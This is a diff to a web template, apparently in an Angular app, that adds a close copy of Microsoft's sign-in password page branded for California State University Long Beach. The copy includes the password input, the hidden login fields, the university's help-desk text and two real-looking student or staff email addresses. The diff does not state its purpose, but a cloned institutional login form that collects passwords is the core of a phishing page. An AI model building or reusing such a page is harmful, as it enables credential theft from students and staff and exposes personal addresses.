@@ -121,7 +121,283 @@
   <div>
       <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->
   
-      <div class="pagination-view animate slide-in-next">
+      <!-- How are you -->
+
+      <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
+        <div data-bind="css: {
+            'animate': animate() &amp;&amp; animate.animateBanner(),
+            'slide-out-next': animate.isSlideOutNext(),
+            'slide-in-next': animate.isSlideInNext(),
+            'slide-out-back': animate.isSlideOutBack(),
+            'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
+    
+            <div data-bind="component: { name: 'identity-banner-control',
+                params: {
+                    userTileUrl: svr.urlProfilePhoto,
+                    displayName: sharedData.displayName || svr.sPOST_Username,
+                    isBackButtonVisible: isBackButtonVisible(),
+                    focusOnBackButton: isBackButtonFocused(),
+                    backButtonDescribedBy: backButtonDescribedBy() },
+                event: {
+                    backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->
+    
+    <div class="identityBanner">
+        <!-- ko if: isBackButtonVisible -->
+        <button type="button" class="backButton" data-bind="
+            attr: { 'id': backButtonId || 'idBtn_Back' },
+            ariaLabel: str['CT_HRD_STR_Splitter_Back'],
+            ariaDescribedBy: backButtonDescribedBy,
+            click: backButton_onClick,
+            hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
+            <!-- ko ifnot: svr.fIsRTLMarket -->
+                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_d1229aefd268f350621d48f094122f69.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"><!-- /ko -->
+    <!-- /ko --><!-- /ko -->
+            <!-- /ko -->
+    
+            <!-- ko if: svr.fIsRTLMarket --><!-- /ko -->
+        </button>
+        <!-- /ko -->
+    
+        <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }">louis.uuh&#64;csulb.edu</div>
+    </div></div>
+        </div>
+        <!-- /ko -->
+    
+        <div class="pagination-view animate has-identity-banner slide-in-next">
+    
+            <!-- ko foreach: views -->
+                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+            
+                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+            
+                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+            
+                <!-- ko if: $parent.currentViewIndex() === $index() -->
+                    <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        isInitialView: isInitialState,
+                        username: sharedData.username,
+                        displayName: sharedData.displayName,
+                        hipRequiredForUsername: sharedData.hipRequiredForUsername,
+                        passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
+                        availableCreds: sharedData.availableCreds,
+                        evictedCreds: sharedData.evictedCreds,
+                        useEvictedCredentials: sharedData.useEvictedCredentials,
+                        showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
+                        flowToken: sharedData.flowToken,
+                        defaultKmsiValue: svr.iDefaultLoginOptions === 1,
+                        userTenantBranding: sharedData.userTenantBranding,
+                        sessions: sharedData.sessions,
+                        callMetadata: sharedData.callMetadata,
+                        supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery,
+                        forgotPasswordText: $loginPage.forgotPasswordText,
+                        accessRecoveryLink: $loginPage.accessRecoveryLink,
+                        boilerPlateText: $loginPage.boilerPlateText,
+                        hideAccountResetCredentials: $loginPage.hideAccountResetCredentials },
+                    event: {
+                        restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
+                        updateFlowToken: $loginPage.view_onUpdateFlowToken,
+                        submitReady: $loginPage.view_onSubmitReady,
+                        redirect: $loginPage.view_onRedirect,
+                        resetPassword: $loginPage.passwordView_onResetPassword,
+                        setBackButtonState: view_onSetIdentityBackButtonState,
+                        setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->
+    
+    <!--  -->
+    
+    <div aria-hidden="true">
+        <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
+    
+        <!-- ko if: svr.fIsUpdatedAutocompleteEnabled -->
+        <input type="hidden" name="login" autocomplete="username" data-bind="value: unsafe_username" value="jeonghun.lee01@student.csulb.edu">
+        <!-- /ko -->
+        <!-- ko ifnot: svr.fIsUpdatedAutocompleteEnabled --><!-- /ko -->
+    
+        <!-- The loginfmt input type is different as some password managers require it to be of type text.
+            Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
+        <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+        <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
+        <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
+        <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
+        <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
+        <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
+        <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
+    </div>
+    
+    <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+        <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
+    </div>
+    
+    <!-- ko if: showCredViewBrandingDesc --><!-- /ko -->
+    
+    <!-- ko if: unsafe_pageDescription --><!-- /ko -->
+    
+    <div class="row">
+        <div class="form-group col-md-24">
+            <div role="alert" aria-live="assertive">
+                <!-- ko if: passwordTextbox.error --><!-- /ko -->
+            </div>
+    
+            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
+                publicMethods: passwordTextbox.placeholderTextboxMethods,
+                params: {
+                    serverData: svr,
+                    hintText: str['CT_PWD_STR_PwdTB_Label'] },
+                event: {
+                    updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
+        <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
+    
+                <input name="passwd" type="password" placeholder="Password" id="i0118" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
+                    attr: { autocomplete: svr.fIsUpdatedAutocompleteEnabled ? 'current-password' : 'off'},
+                    textInput: passwordTextbox.value,
+                    ariaDescribedBy: [
+                        'loginHeader passwordError',
+                        showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
+                        unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
+                    hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
+                    placeholder: $placeholderText,
+                    ariaLabel: unsafe_passwordAriaLabel,
+                    moveOffScreen: showPassword,
+                    externalCss: {
+                        'input': true,
+                        'text-box': true,
+                        'has-error': passwordTextbox.error }" autocomplete="current-password" aria-describedby="loginHeader passwordError  " aria-label="Enter the password for jeonghun.lee01@student.csulb.edu" tabindex="0">
+    
+                <!-- ko if: svr.fUsePasswordPeek && showPassword() --><!-- /ko -->
+            <!-- /ko -->
+    <!-- /ko -->
+    <!-- ko ifnot: usePlaceholderAttribute -->
+    <!-- /ko --></div>
+    
+            <!-- ko if: svr.fUsePasswordPeek --><!-- /ko -->
+        </div>
+    </div>
+    
+    <!-- ko if: shouldHipInit --><!-- /ko -->
+    
+    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="password-reset-links-container ext-password-reset-links-container">
+        <div>
+            <!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko -->
+            <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->
+    
+            <div class="row">
+                <div class="col-md-24">
+                    <div class="text-13">
+                        <!-- ko if: svr.urlSkipZtd && svr.sZtdUpnHint --><!-- /ko -->
+                        <!-- ko ifnot: hideForgotMyPassword -->
+                        <div class="form-group">
+                            <!-- ko if: svr.fFixUrlResetPassword -->
+                            <a
+                            id="idA_PWD_ForgotPassword"
+                            [style.font-size.rem]=".8125"
+                            data-bind="
+                                text: unsafe_forgotPasswordText,
+                                href: resetPasswordUrl || '#',
+                                attr: {
+                                  target: accessRecoveryLink &amp;&amp; '_blank',
+                                  role: resetPasswordUrl ? 'link' : 'button'
+                                },
+                                click: accessRecoveryLink ? null : resetPassword_onClick" href="https://password.csulb.edu" target="_blank" role="link">Reset my password</a>
+                            <!-- /ko -->
+                            <!-- ko ifnot: svr.fFixUrlResetPassword --><!-- /ko -->
+                        </div>
+                        <!-- /ko -->
+                        <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
+                        <!-- ko ifnot: useEvictedCredentials -->
+                            <!-- ko component: { name: "cred-switch-link-control",
+                                params: {
+                                    serverData: svr,
+                                    username: username,
+                                    availableCreds: availableCreds,
+                                    flowToken: flowToken,
+                                    currentCred: { credType: 1 } },
+                                event: {
+                                    switchView: credSwitchLink_onSwitchView,
+                                    redirect: onRedirect,
+                                    setPendingRequest: credSwitchLink_onSetPendingRequest,
+                                    updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->
+    
+    <div class="form-group">
+        <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->
+    
+        <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->
+    
+        <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
+    </div>
+    
+    <!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->
+    
+                            <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
+                        <!-- /ko -->
+                        <!-- ko if: showChangeUserLink --><!-- /ko -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="win-button-pin-bottom boilerplate-button-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
+        <div class="row move-buttons" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
+            <div data-bind="component: { name: 'footer-buttons-field',
+                params: {
+                    serverData: svr,
+                    primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
+                    isPrimaryButtonEnabled: !isRequestPending(),
+                    isPrimaryButtonVisible: svr.fShowButtons,
+                    isSecondaryButtonEnabled: true,
+                    isSecondaryButtonVisible: false },
+                event: {
+                    primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
+        visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+        css: { 'no-margin-bottom': removeBottomMargin },
+        externalCss: { 'button-field-container': true }">
+    
+        <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
+    
+        <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
+            <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
+            <!-- ko ifnot: svr.fConsentButtonIdViaName -->
+            <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
+                    attr: primaryButtonAttributes,
+                    css: { 'high-contrast-overrides': svr.fUseHighContrastOverrides },
+                    externalCss: {
+                        'button': true,
+                        'primary': true },
+                    value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                    hasFocus: focusOnPrimaryButton,
+                    click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
+                    clickBubble: !svr.fEnableLivePreview,
+                    enable: isPrimaryButtonEnabled,
+                    visible: isPrimaryButtonVisible,
+                    preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
+            <!-- /ko -->
+            <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
+        </div>
+    </div></div>
+        </div>
+    </div>
+    
+    <!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText-->
+    <div id="idBoilerPlateText" class="wrap-content boilerplate-text ext-boilerplate-text" data-bind="
+        htmlWithMods: svr.fEnableLivePreview ? boilerPlateText : tenantBranding.BoilerPlateText,
+        htmlMods: { filterLinks: svr.fIsHosted },
+        css: { 'transparent-lightbox': tenantBranding.UseTransparentLightBox },
+        externalCss: { 'boilerplate-text': true }"><p>For assistance, please contact the <a href="https://helpdesk.csulb.edu/" rel="noopener noreferrer" target="_blank">Technology Help Desk</a>. By using this service, you acknowledge and agree to the <a href="https://www.csulb.edu/information-technology/information-security/policies-standards-procedures" rel="noopener noreferrer" target="_blank">Information Security and Acceptable Use</a> policies.</p>
+    </div>
+    <!-- /ko -->
+    </div>
+        </div>
+    </div>
+
+      <div
+        *ngIf="false"
+        class="pagination-view animate slide-in-next"
+      >
   
           <!-- ko foreach: views -->
               <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
